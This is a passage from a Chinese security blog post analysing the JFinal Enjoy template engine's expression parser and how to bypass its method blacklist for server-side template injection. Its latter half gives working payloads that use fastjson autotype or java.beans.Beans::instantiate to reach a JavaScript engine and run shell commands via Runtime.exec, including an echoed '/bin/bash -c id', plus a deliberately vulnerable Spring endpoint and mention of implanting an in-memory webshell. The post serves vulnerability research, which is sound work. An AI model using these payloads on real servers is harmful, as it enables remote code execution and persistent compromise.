class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ExprList <span class="title">exprList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ArrayList exprList = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            Expr expr = <span class="keyword">this</span>.expr();</span><br><span class="line">            <span class="keyword">if</span> (expr == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            exprList.add(expr);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.peek().sym != Sym.COMMA) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.move();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.peek() == EOF) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseException(<span class="string">&quot;Expression error: can not match the char of comma &#x27;,&#x27;&quot;</span>, <span class="keyword">this</span>.location);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ExprList(exprList);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里放一个调用栈就好了，有兴趣可以自己跟一跟(它规定了以什么样的顺序去解析我们的表达式)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">staticMember:<span class="number">326</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">incDec:<span class="number">287</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">unary:<span class="number">279</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">nullSafe:<span class="number">253</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">mulDivMod:<span class="number">241</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">addSub:<span class="number">229</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">greaterLess:<span class="number">216</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">equalNotEqual:<span class="number">203</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">and:<span class="number">191</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">or:<span class="number">179</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">ternary:<span class="number">165</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">assign:<span class="number">158</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">expr:<span class="number">127</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">exprList:<span class="number">110</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">parse:<span class="number">97</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">parseExprList:<span class="number">76</span>, ExprParser (com.jfinal.template.expr)</span><br><span class="line">parseExprList:<span class="number">269</span>, Parser (com.jfinal.template.stat)</span><br><span class="line">stat:<span class="number">117</span>, Parser (com.jfinal.template.stat)</span><br><span class="line">statList:<span class="number">87</span>, Parser (com.jfinal.template.stat)</span><br><span class="line">parse:<span class="number">77</span>, Parser (com.jfinal.template.stat)</span><br><span class="line">buildTemplateBySource:<span class="number">305</span>, Engine (com.jfinal.template)</span><br><span class="line">getTemplateByString:<span class="number">242</span>, Engine (com.jfinal.template)</span><br><span class="line">getTemplateByString:<span class="number">223</span>, Engine (com.jfinal.template)</span><br><span class="line">main:<span class="number">50</span>, Test (com.example.ezsb)</span><br></pre></td></tr></table></figure><p>最终在staticMember会返回一个实例化的staticMember对象<img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/15.png"></p><p>在初始化的时候还会检查类名与方法名是否在黑名单当中，具体的在上面提到过就不贴了<a href="#方法调用">点我直达</a><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/16.png"></p><p>后面过程就省略了，已经到了我们想要的了，后面就是如何调用这个静态函数了，当然其实不止能调用静态方法，还可以直接调用实例对象的方法，但是也是有黑名单拦截</p><h2 id="绕过Bypass"><a href="#绕过Bypass" class="headerlink" title="绕过Bypass"></a>绕过Bypass</h2><p>根据之前的调试我们知道，如果想要在模板里面执行函数有几个条件</p><ul><li>对于调用静态方法，只能调用公共静态方法(但不能用黑名单当中的类以及方法)</li><li>对于实例对象的方法，只能调用public修饰的(但不能用黑名单当中的类以及方法)</li></ul><p>绕过第一个方式直接命令执行比较难，那么如果是第二种方式的话那我们肯定需要获取一个类的实例，那么有没有一个public类的静态方法能返回我们任意的实例呢，那就看看有没有办法能够返回一个类的实例呢？这样就可以 javax.script.ScriptEngineManager来执行任意Java代码(这样也比较好绕过黑名单了)</p><p>首先网上搜了搜jfinal的历史，发现可以通过fastjson去实例化一个类，同时可以开启autotype，构造payload长这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance())</span><br><span class="line">#(x.setAutoTypeSupport(<span class="keyword">true</span>))</span><br><span class="line">#(x.addAccept(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>))</span><br><span class="line">#set(a=com.alibaba.fastjson.JSON::parse(<span class="string">&#x27;&#123;&quot;@type&quot;:&quot;javax.script.ScriptEngineManager&quot;&#125;&#x27;</span>))</span><br><span class="line">#set(b=a.getEngineByName(<span class="string">&#x27;js&#x27;</span>))</span><br><span class="line">#set(payload=xxxxxx)</span><br><span class="line">#(b.eval(payload))</span><br></pre></td></tr></table></figure><p>既然这样那有没有jre当中的类可以实现类似的效果呢？答案是有</p><h3 id="Java自带类绕过"><a href="#Java自带类绕过" class="headerlink" title="Java自带类绕过"></a>Java自带类绕过</h3><p>我发现有一个类<code>java.beans.Beans</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">instantiate</span><span class="params">(ClassLoader cls, String beanName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Beans.instantiate(cls, beanName, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法又臭又长，不过好在符合条件classLoader也不需要传，真舒服呀</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cls == <span class="keyword">null</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    cls = ClassLoader.getSystemClassLoader();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (SecurityException ex) &#123;</span><br><span class="line">    <span class="comment">// We&#x27;re not allowed to access the system class loader.</span></span><br><span class="line">    <span class="comment">// Drop through.</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/17.png"></p><p>因此配合这个类顺手拿下模板SSTI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set((java.beans.Beans::instantiate(<span class="keyword">null</span>,<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>)).getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;function test()&#123; return java.lang.Runtime&#125;;r=test();r.getRuntime().exec(\&quot;open -na Calculator\&quot;)&quot;</span>))</span><br></pre></td></tr></table></figure><h2 id="获取回显"><a href="#获取回显" class="headerlink" title="获取回显"></a>获取回显</h2><p>我们考虑两个场景，一个是直接执行，另一个return返回值</p><h3 id="写入内存马"><a href="#写入内存马" class="headerlink" title="写入内存马"></a>写入内存马</h3><p>既然能够执行任意代码了那肯定拿下内存马，这里启一个springboot环境测试，简单测试下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">abc</span><span class="params">(<span class="meta">@RequestParam(&quot;base&quot;)</span> String base)</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">  ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder();</span><br><span class="line">  Engine engine = Engine.use();</span><br><span class="line">  engine.setDevMode(<span class="keyword">true</span>);</span><br><span class="line">  engine.setToClassPathSourceFactory();</span><br><span class="line">  Template template = engine.getTemplateByString(base);</span><br><span class="line">  String result = template.renderToString();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/18.png"></p><h3 id="直接回显"><a href="#直接回显" class="headerlink" title="直接回显"></a>直接回显</h3><p>很简单不需要讲了都，很常规payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base=#((java.beans.Beans::instantiate(<span class="keyword">null</span>,<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>)).getEngineByExtension(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;var s = [3];s[0] = \&quot;/bin/bash\&quot;;s[1] =\&quot;-c\&quot;;s[2] = \&quot;id\&quot;;var p =java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\&quot;GBK\&quot;).useDelimiter(\&quot;\\A\&quot;);var result = sc.hasNext() ? sc.next() : \&quot;\&quot;;sc.close();result;&quot;</span>))</span><br></pre></td></tr></table></figure><p>测试下</p><p><img src="/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/19.png"></p></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Enjoy模板引擎分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E6%A1%A3%E4%B8%AD%E5%80%BC%E5%BE%97%E5%85%B3%E6%B3%A8%E7%9A%84%E7%82%B9"><span class="toc-number">1.1.1.</span> <span class="toc-text">文档中值得关注的点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE%E8%A7%A6%E5%8F%91get%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">属性访问触发get方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">方法调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">静态属性访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">静态方法的调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E6%93%8E%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">引擎执行流程简单分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87Bypass"><span class="toc-number">1.3.</span> <span class="toc-text">绕过Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E8%87%AA%E5%B8%A6%E7%B1%BB%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.1.</span> <span class="toc-text">Java自带类绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9B%9E%E6%98%BE"><span class="toc-number">1.4.</span> <span class="toc-text">获取回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.4.1.</span> <span class="toc-text">写入内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%9B%9E%E6%98%BE"><span class="toc-number">1.4.2.</span> <span class="toc-text">直接回显</span></a></li></ol></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&text=Enjoy模板引擎分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&is_video=false&description=Enjoy模板引擎分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=Enjoy模板引擎分析&body=Check out this article: https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&title=Enjoy模板引擎分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&name=Enjoy模板引擎分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2022/04/14/year/2022/4/Enjoy%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E5%88%86%E6%9E%90/&t=Enjoy模板引擎分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2025 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>